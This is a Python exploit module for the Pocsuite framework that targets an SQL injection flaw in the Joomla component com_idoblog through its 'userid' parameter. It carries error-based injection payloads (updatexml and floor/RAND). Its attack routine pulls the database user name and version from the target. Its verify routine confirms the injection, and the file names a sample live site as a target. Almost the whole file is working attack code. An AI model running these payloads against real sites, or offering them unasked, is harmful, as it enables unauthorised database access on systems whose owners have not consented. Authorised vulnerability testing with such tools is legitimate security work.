#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '70468'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-12-25'
    createDate = '2016-01-23'
    updateDate = '2016-01-23'
    references = ['http://www.seebug.org/vuldb/ssvid-70468']
    name = 'Joomla Component (com_idoblog) SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'Joomla Component (com_idoblog)'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla 组件(com_idoblog)对参数userid过滤不严格，导致出现SQL注入漏洞。
        远程攻击者无需登陆，可以利用该漏洞执行SQL指令。

        利用updatexml报错回显方式读取数据库版本的POC如下所示：

        http://xxx.com/index.php?option=com_idoblog&task=profile&Itemid=1337&userid=-1
        or 1=(updatexml(1,concat(0x3a,version()),1))
    '''
    samples = ['http://www.aca2k.org']

    def _attack(self):
        #利用floor注入读取MySQL数据库信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_idoblog&task=profile&Itemid=&userid='
        #利用floor方式读取信息
        payload="-1 or 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x247e7e7e24,"\
        "user(),0x2a2a2a,version(),0x247e7e7e24,FLOOR(RAND(0)*2))x FROM "\
        "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串
        if 'Duplicate entry' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['DbInfo']={}
                #数据库用户名
                result['DbInfo']['Username']=match.group(1)
                #数据库版本
                result['DbInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #通过floor方式计算md5(3.1415)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_idoblog&task=profile&Itemid=&userid='
        #利用floor的方式（计算md5(3.1415)）
        payload="-1 or 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x247e7e7e24,"\
        "md5(3.1415),FLOOR(RAND(0)*2))x FROM "\
        "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
        if '63e1f04640e83605c1d177544a5a0488' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)